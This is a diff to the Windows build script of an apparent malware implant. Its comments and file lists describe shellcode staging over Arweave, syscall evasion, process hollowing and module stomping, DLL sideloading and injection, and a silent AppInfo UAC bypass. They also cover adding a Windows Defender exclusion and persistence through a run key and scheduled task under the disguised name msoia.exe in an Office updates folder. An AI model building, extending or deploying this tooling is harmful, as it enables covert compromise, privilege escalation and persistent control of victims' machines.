@@ -9,11 +9,12 @@ REM         build.bat sideload version.dll      (custom output name)
 REM         build.bat sideload uac              (DLL with self-elevation + WD exclusion)
 REM         build.bat sideload version.dll uac  (custom name + elevation)
 REM
-REM  UAC modules (UAC_BYPASS builds):
+REM  All EXE builds:
+REM    Install.c  - Copy self to %APPDATA%\...\Updates\msoia.exe (non-UAC: no WD excl, no terminate)
+REM    Persist.c  - Registry run-key persistence (non-UAC only)
+REM  UAC EXE only:
 REM    Uac.c      - AppInfo RPC bypass (two-process, no manifest, no UAC dialog)
-REM    Install.c  - Copy self to hidden path + run-key + WD exclusion
-REM  Non-UAC:
-REM    Persist.c  - Registry run-key persistence
+REM    Install.c  - Also: WD exclusion via elevated PS + scheduled task + NtTerminateProcess
 REM =============================================
 
 SET "VSTOOLS="
@@ -39,14 +40,12 @@ IF "%1"=="sideload" IF NOT EXIST Sideload.h (
 )
 
 REM --- Default: EXE build ---
-REM     Persist.c is included for non-UAC builds (HKCU run-key, medium IL)
-SET OUTNAME=WUAssistant.exe
-SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Persist.c
+REM     Install.c: copies self to %APPDATA%\Microsoft\Office\Updates\msoia.exe (non-UAC, no WD excl)
+REM     Persist.c: writes HKCU run-key pointing at msoia.exe
+IF NOT DEFINED OUTNAME SET OUTNAME=msoia.exe
+SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Install.c Persist.c
 SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
 SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib
-
-REM --- Optional extra flags from the web UI or caller (e.g. /DDEBUG) ---
-IF DEFINED CFLAGS_EXTRA SET CFLAGS=%CFLAGS% %CFLAGS_EXTRA%
 
 REM --- EXE UAC: two-process AppInfo bypass (no manifest) + WD exclusion ---
 REM     /DUAC_BYPASS   → Uac.c + Install.c compiled in; no manifest; no UAC dialog.
@@ -54,7 +53,7 @@ REM     Medium-IL first run → AppInfo RPC → spawn elevated self → install 
 REM     Elevated instance → copy to msoia.exe + WD exclusion + HKCU run-key → terminate.
 REM     Subsequent boots: msoia.exe (medium IL) detects install path → skips bypass → runs shellcode.
 IF NOT "%1"=="sideload" IF %UAC%==1 (
-    SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Uac.c Install.c
+    SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Uac.c Install.c
     SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DUAC_BYPASS"
     SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib
     echo [*] UAC bypass enabled ^(AppInfo RPC, no manifest^)
@@ -65,22 +64,25 @@ IF NOT "%1"=="sideload" IF %UAC%==1 (
 REM --- Override for sideload DLL build ---
 IF "%1"=="sideload" (
     SET OUTNAME=sideload.dll
-    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Persist.c
+    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Install.c Persist.c Inject.c
     SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL"
     SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib"
     echo [*] Building DLL sideload variant...
-    echo [*] Persist: HKCU run-key
+    echo [*] Persist: HKCU run-key pointing to msoia.exe
 )
 
 REM --- DLL UAC: AppInfo bypass + WD exclusion + self-install ---
 IF "%1"=="sideload" IF %UAC%==1 (
-    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Solana.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Uac.c Install.c
+    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Stomper.c Phantom.c GhostHollow.c Gadgets.c Uac.c Install.c Inject.c
     SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL /DREQUIRE_ELEVATION /DUAC_BYPASS"
     SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib"
     echo [*] UAC bypass enabled ^(AppInfo RPC^)
     echo [*] WD exclusion enabled
     echo [*] Persist: HKCU run-key via Install.c
 )
+
+REM --- Append optional extra flags AFTER all CFLAGS resets (e.g. /DDEBUG from web UI) ---
+IF DEFINED CFLAGS_EXTRA SET CFLAGS=%CFLAGS% %CFLAGS_EXTRA%
 
 REM --- Override output name (skip "uac" token) ---
 IF "%1"=="sideload" IF NOT "%2"=="" IF NOT "%2"=="uac" SET "OUTNAME=%2"
